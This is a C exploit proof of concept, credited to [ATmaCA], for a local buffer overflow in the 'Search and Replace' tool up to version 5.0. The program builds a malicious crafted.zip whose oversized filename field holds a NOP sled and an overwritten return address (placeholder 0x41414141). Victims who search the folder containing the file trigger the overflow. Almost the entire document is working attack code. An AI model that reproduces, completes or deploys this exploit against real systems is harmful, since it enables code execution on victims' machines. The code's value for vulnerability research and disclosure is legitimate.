/* Search and Replace Compressed File search Local Buffer Overflow Exploit
*
* Discoveried & Coded By [ATmaCA]
* Copyright �2002-2005 AtmacaSoft Inc. All Rights Reserved.
* Web: http://www.atmacasoft.com
* E-Mail: atmaca@icqmail.com
* Greetings to: Tarako
*
*/

/*
*
* Search and Replace 5.0 and prior versions are affected.
* Run this code and create crafted.zip,
* then search this directoria where the crafted.zip stored.
*
*/

#include <stdio.h>
#include <windows.h>

#pragma pack(1)

typedef struct {
DWORD Signature; // PK.. 4 bytes (0x04034B50)
WORD VersionNeeded;
WORD GeneralPurposeFlag;
WORD CompressionMethod;
WORD ModFileTime;
WORD ModFileDate;
DWORD Crc32;
DWORD CompressedSize;
DWORD UncompressedSize;
WORD FilenameLength;
WORD ExtraFieldLength;
// filename (variable size)
// extra field (variable size)
}TOPHEADER;


typedef struct { 
DWORD Signature; // PK.. 4 bytes (0x02014B50)
WORD MadeVersion;
WORD VersionNeeded;
WORD GeneralPurposeFlag;
WORD CompressionMethod;
WORD ModFileTime;
WORD ModFileDate;
DWORD Crc32;
DWORD CompressedSize;
DWORD UncompressedSize;
WORD FilenameLength;
WORD ExtraFieldLength;
WORD FileCommentLength;
WORD DiskNumberStart;
WORD InternalFileAttributes;
DWORD ExternalFileAttributes;
DWORD RelativeOffsetOfLocalHeader;
// filename (variable size)
// extra field (variable size)
// file comment (variable size)
}MIDDLEHEADER;

typedef struct {
DWORD Signature; // PK.. 4 bytes (0x06054B50)
WORD NumOfThisDisk;
WORD NumDisckStartCentralDirectory;
WORD NumEntriesCentralDirOnThisDisk;
WORD TotalNumEntriesCentralDir;
DWORD SizeCentralDirectory;
DWORD OffsetCentraDirRespectStartDiskNum;
WORD ZipCommentLength;
// zipfile comment (variable size)
}BOTTOMHEADER;

char Ret_Addr[]= "\x41\x41\x41\x41"; //* EIP

int main(int argc,char *argv[]) {

FILE *ZipFile;
TOPHEADER *Cabecera1;
MIDDLEHEADER *Cabecera2;
BOTTOMHEADER *Cabecera3;

DWORD c;
UINT i;
char *filename;
char *url;

printf("\nSearch and Replace Compressed File search Buffer Overflow 
Exploit");
printf("Discoveried & Coded By [ATmaCA]\n");
printf("Copyright �2002-2005 AtmacaSoft Inc. All Rights Reserved.\n");
printf("Web: http://www.atmacasoft.com\n");
printf("E-Mail: atmaca@icqmail.com\n\n");
printf("Greetings to: Tarako\n\n");



if (!(ZipFile=fopen("crafted.zip","w+b"))) {
printf("\n [E] fopen()");
exit(1);
}

c=500; // filename length
filename=(char*)malloc(sizeof(char)*c);
memset(filename,0,sizeof(filename));

for( i=0x0;i<c;i++) filename[i]=(BYTE)0x90;

///*Overwriting the return address (EIP)
memcpy(filename+237,Ret_Addr,strlen(Ret_Addr)); // Ret Addr EIP 
0x41414141

Cabecera1=(TOPHEADER*)malloc(sizeof(TOPHEADER));
Cabecera2=(MIDDLEHEADER*)malloc(sizeof(MIDDLEHEADER));
Cabecera3=(BOTTOMHEADER*)malloc(sizeof(BOTTOMHEADER));
memset(Cabecera1,0,sizeof(TOPHEADER));
memset(Cabecera2,0,sizeof(MIDDLEHEADER));
memset(Cabecera3,0,sizeof(BOTTOMHEADER));

///////////////////////////////////////////////////////////////////
// TOPHEADER
///////////////////////////////////////////////////////////////////
Cabecera1->Signature=0x04034B50; // DWORD
Cabecera1->VersionNeeded=0x000A; // WORD
Cabecera1->GeneralPurposeFlag=0x0002; // WORD 
Cabecera1->CompressionMethod=0x0000; // WORD
Cabecera1->ModFileTime=0x1362; // WORD
Cabecera1->ModFileDate=0x3154; // WORD
Cabecera1->Crc32=0x85B36639; // DWORD
Cabecera1->CompressedSize=0x00000015; // DWORD
Cabecera1->UncompressedSize=0x00000015; // DWORD
Cabecera1->FilenameLength=(WORD)c; // WORD 0x0400;//strlen(filename);
Cabecera1->ExtraFieldLength=0x0000; // WORD
///////////////////////////////////////////////////////////////////

///////////////////////////////////////////////////////////////////
// MIDDLEHEADER
///////////////////////////////////////////////////////////////////
Cabecera2->Signature=0x02014B50; // DWORD
Cabecera2->MadeVersion=0x0014; // WORD
Cabecera2->VersionNeeded=0x000A; // WORD
Cabecera2->GeneralPurposeFlag=0x0002; // WORD
Cabecera2->CompressionMethod=0x0000; // WORD
Cabecera2->ModFileTime=0x1362; // WORD
Cabecera2->ModFileDate=0x3154; // WORD
Cabecera2->Crc32=0x85B36639; // DWORD
Cabecera2->CompressedSize=0x00000015; // DWORD
Cabecera2->UncompressedSize=0x00000015; // DWORD
Cabecera2->FilenameLength=(WORD)c; // WORD 0x0400;//strlen(filename);
Cabecera2->ExtraFieldLength=0x0000; // WORD
Cabecera2->FileCommentLength=0x0000; // WORD
Cabecera2->DiskNumberStart=0x0000; // WORD
Cabecera2->InternalFileAttributes=0x0001; // WORD
Cabecera2->ExternalFileAttributes=0x00000020; // DWORD
Cabecera2->RelativeOffsetOfLocalHeader=0x00000000; // DWORD
///////////////////////////////////////////////////////////////////

///////////////////////////////////////////////////////////////////
// BOTTOMHEADER
///////////////////////////////////////////////////////////////////
Cabecera3->Signature=0x06054B50; // DWORD
Cabecera3->NumOfThisDisk=0x0000; // WORD
Cabecera3->NumDisckStartCentralDirectory=0x0000; // WORD
Cabecera3->NumEntriesCentralDirOnThisDisk=0x0001; // WORD
Cabecera3->TotalNumEntriesCentralDir=0x0001; // WORD
Cabecera3->SizeCentralDirectory=sizeof(MIDDLEHEADER)+c; // DWORD
//Cabecera3->OffsetCentraDirRespectStartDiskNum=sizeof(TOPHEADER)+strlen(DATOS)+c;
// DWORD
Cabecera3->ZipCommentLength=0x0000; // WORD
///////////////////////////////////////////////////////////////////

fwrite(Cabecera1, sizeof(TOPHEADER), 1,ZipFile);

fwrite(filename, c, 1,ZipFile);

fwrite(Cabecera2, sizeof(MIDDLEHEADER), 1,ZipFile);
fwrite(filename, c, 1,ZipFile); 
fwrite(Cabecera3, sizeof(BOTTOMHEADER), 1,ZipFile);

fclose(ZipFile);
printf("\ncrafted.zip has been created.\n");
return 1;
}

